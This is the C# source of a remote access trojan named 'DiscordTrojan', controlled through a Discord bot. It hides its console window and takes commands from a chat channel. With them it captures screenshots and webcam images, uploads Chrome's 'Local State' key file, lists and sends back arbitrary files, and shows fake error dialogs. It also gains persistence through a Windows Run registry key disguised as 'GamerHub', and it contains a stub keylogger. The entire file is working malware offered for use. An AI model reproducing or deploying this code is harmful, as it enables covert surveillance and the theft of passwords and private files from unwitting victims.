using System;
using System.Drawing;
using System.Threading.Tasks;
using Discord;
using Discord.WebSocket;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Sockets;
using System.IO;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Threading;




namespace DiscordTrojan
{
    
    public class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]

        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string root = @"\AppData\LocalLow";




        public static void Main(string[] args)
        => new Program().MainAsync().GetAwaiter().GetResult();





        private DiscordSocketClient _client;

        


        public async Task MainAsync()
        {         
            const int SW_HIDE = 0;
            //const int SW_SHOW = 5;
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            //ShowWindow(handle, SW_SHOW);

            _client = new DiscordSocketClient();
            _client.MessageReceived += CommandHandler;
            _client.Log += Log;

            var token = "TOKEN";



            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();

            await Task.Delay(-1);
        }

        private Task Log(LogMessage msg)
        {
            Console.WriteLine(msg.ToString());
            return Task.CompletedTask;
        }

        private Task CommandHandler(SocketMessage message)
        {
            //acctuall commands here
            if (message.Content == "!ping")
            {
                message.Channel.SendMessageAsync($@"pong, {message.Author.Mention}");
            }
            
            if (message.Content == "!help")
            {
                var help = new EmbedBuilder();
                help.WithTitle("Help");
                help.WithDescription("!ping - pong\n\n!ScreenShot - show photo of desktop\n\n!get chrome passwords - returns a enycrypted password sheat\n\n!Info - shows basic info about the pc and network\n\n!MessageBoxError (message) - sends the user a error message box\n\n!MessageBoxWarning (message) - sends the user a warning message box\n\n!get files (directory) - returns all files in dir and in subdirectorys WARNING dont run this in a big folder or else your going to have a bad time.\n\n!get file (directory) - returns the file you want to download\n\n!send startup true/false this will add program to startup if you type true\n\n!CameraSnap get a picture with your camera");
                help.WithColor(Discord.Color.Teal);
                message.Channel.SendMessageAsync("", false, help.Build());
            }

            if (message.Content == "!ScreenShot")
            {
                GetDesktop();
                message.Channel.SendFileAsync(userPath + root + "\\Capture.jpg");
                Thread.Sleep(1000);
                DeleteFunction(userPath + root + "\\Capture.jpg");
            }

            if (message.Content == "!get chrome passwords")
            {
                message.Channel.SendFileAsync("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Local State");
            }

            if (message.Content == "!Info")
            {
                message.Channel.SendMessageAsync("Machine name: " + System.Environment.MachineName + "\nIp adress: " + GetIp());
            }

            if (message.Content.StartsWith("!MessageBoxError"))
            {
                string arg = message.Content.Replace("!MessageBoxError", " ");
                MessageBox.Show(arg, "Save error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                message.Channel.SendMessageAsync("Sent and read");
            }
            if (message.Content.StartsWith("!MessageBoxWarning"))
            {
                string arg = message.Content.Replace("!MessageBoxWarning"," ");
                MessageBox.Show(arg, "Save error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                message.Channel.SendMessageAsync("Sent and read");
            }

            if (message.Content.StartsWith("!send startup true"))
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("GamerHub", $@"{System.Windows.Forms.Application.ExecutablePath}");
            }

            if (message.Content.StartsWith("!send startup false"))
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.DeleteValue("GamerHub", false);
            }

            if (message.Content.StartsWith("!get files"))
            {
                var arg = message.Content.Split(new[] { "!get files" }, StringSplitOptions.None)[1];
                try
                {
                    string[] filePaths = Directory.GetFiles($@"{arg}", "*", SearchOption.AllDirectories);
                    string allDir = "";
                    for (int i = 0; i < filePaths.Length; i++)
                    {
                        allDir = string.Concat(allDir, "\n" + filePaths[i]);
                    }
                    message.Channel.SendMessageAsync(allDir);
                }
                catch
                {
                    message.Channel.SendMessageAsync("Directory not valid.");
                }
            }

            if (message.Content.StartsWith("!get file"))
            {
                var arg = message.Content.Split(new[] { "!get file" }, StringSplitOptions.None)[1];
                try
                {
                    message.Channel.SendFileAsync(arg);
                }
                catch
                {
                    message.Channel.SendMessageAsync("Directory not valid.");
                }
            }


            if (message.Content == "!CameraSnap")
            {
                try
                {
                    CameraSnap();
                    message.Channel.SendFileAsync(userPath + root + "\\Capture1.jpg");
                    Thread.Sleep(1000);
                    DeleteFunction(userPath + root + "\\Capture1.jpg");
                }
                catch
                {

                }
            }
            return Task.CompletedTask;
        }


        void GetDesktop()
        {
            Rectangle size = Screen.GetBounds(Point.Empty);
            Bitmap captureBitmap = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppArgb);
            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
            captureBitmap.Save(userPath + root + "\\Capture.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
            
        }

        void KeyLogger()
        {
            while(true)
            {
                Thread.Sleep(100);
                for(int i = 0; i < 255; i++)
                {

                }
            }
        }

        // ************************ CAMERA ********************************
        void CameraSnap()
        {
           Camera camera = new Camera();
           camera.Show();
        }
        void DeleteFunction(string fileNameToDelete = "")
        {
            try
            {
                if (File.Exists(fileNameToDelete))
                {
                    File.Delete(fileNameToDelete);
                }
            }
            catch
            {

            }
        }
        // ****************************************************************

        string GetIp()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("no");
        }


    }
}
